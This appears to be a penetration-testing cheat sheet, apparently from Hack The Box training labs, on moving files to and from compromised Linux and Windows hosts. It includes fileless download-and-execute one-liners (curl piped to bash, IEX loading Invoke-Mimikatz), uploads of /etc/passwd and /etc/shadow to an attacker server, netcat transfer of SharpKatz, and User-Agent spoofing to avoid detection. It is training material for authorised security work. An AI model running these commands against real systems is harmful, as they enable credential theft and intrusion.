---
tags: [basics, technique, file-transfer]
---


## Overview

![[file_transfer_techniques.png]]

General notes from various techniques:
- LNK triggered execution of WMIC tool 
- JS code used to download using the Bitsadmin tool
- Base64 encoding/decoding using Certutil tool


## Reference 

- [Microsoft: Dismantling a Fileless Campaign - Astaroth](https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)
- [Common Powershell Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)


## Spinning Up File Servers 

```bash
# Python HTTP Server with given port and network interface. For the interface provide the IP which is assigned to the desired interface 
python3 -m http.server <PORT> --bind <INTERFACE>

# Python uploadserver (HTTP server with upload endpoint)
sudo python3 -m pip install --user uploadserver 
python3 -m uploadserver 

# Web Server with PHP
php -S 0.0.0.0:8000

# Web Server with Ruby
ruby -run -ehttpd . -p8000

# FTP server (write enabled)
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write

# SMB share with impacket
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# WebDAV (SMB over HTTP)
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Self-signed TLS for an HTTPS uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https 
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```


## Linux Downloads

```bash
# Generic wget
wget "https://filelocation"
wget -O /path/to/directory/file.ext <URL>
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# Generic curl
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Fileless: pipe directly into interpreter
wget -q0- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```


## Linux Uploads

```bash
# SCP
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
scp linenum.sh user@remotehost:/tmp/linenum.sh

# Upload multiple files to uploadserver
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# Python one-liner upload
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```


## Validating File Integrity 

```bash
md5sum shell
file <filename>
```


## Windows Downloads via PowerShell

```powershell
# Standard download
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Powershellblalasdflasl','C:\Users\Public\Downloads\PowerView.ps1')

# Async download
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/Powershellblalasdflasl','C:\Users\Public\Downloads\PowerView.ps1')

# Fileless execution — pull and IEX
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Use Basic Parsing if Invoke-WebRequest errors out
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# Bypass TLS cert validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


## Windows: Transfer Data using SMB

On your attacker machine you can setup an smb fileshare (ideally with username and password):
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

This then can be mounted by the windows machine:
```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test
```


## Windows: Transfer Data using FTP

Starting up an FTP Server using Python:
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

After that we can fetch the file using a Windows instance:
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Upload
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


## Windows: Base64 Encoding/Decoding

```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```


## Windows: Web Uploads

First set up your Fileserver on Linux to receive data:
```bash
pip3 install uploadserver
python3 -m uploadserver 
```

Then use the other machine to invoke a web request:
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

Base64-then-POST as a raw body:
```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

For the above to work you need a listener on your machine: `nc -lvnp 8080`


## Windows: SMB Uploads via WebDAV

If companies are blocking SMB you can do SMB over HTTP using WebDAV (RFC 4918):

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Access from Windows:
```cmd
# Browse the share
dir \\192.168.49.128\DavWWWRoot

# Upload via copy
copy C:\Users\johh\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```


## Transferring Files with Code 

```bash
# Using python 
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Using php with File_get_contents()
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# Using php with Fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Using Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Perl 
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

JScript file download:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

VBScript download (with cscript runner):
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```


## Misc File Transfer Methods 

### Netcat / Ncat

```bash
# Setup listener on Port 8000 on the victim machine 
nc -l -p 8000 > SharpKatz.exe 

# From the attacker machine we can send, where as the -q 0 closes the connection after upload 
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Netcat - Attack Host - Sending File to compromised machine 
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 192.168.49.128 8000 < SharpKatz.exe

# Ncat send-only
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### PowerShell Sessions

```powershell
$Session = New-PSSession -computerName DATABASE01

# Now we can use the session to transfer data
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```


## Mounting Linux Folders via RDP

```bash
# rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

# xfreerdp
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```


## Encrypted Transfers

Windows (PowerShell):
```powershell
Import-Module Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

Linux (openssl):
```bash
# Encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```


## Helpers

- Check listening ports: `netstat -lnpt`
- Useful User Agent reference: https://useragentstring.com/index.php
- Fake the User Agent to look like Chrome:
```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```


## Base64 (if you can't transfer files)

When binary transfer is blocked, encode the file as base64 and copy/paste:
```bash
base64 shell -w 0
```
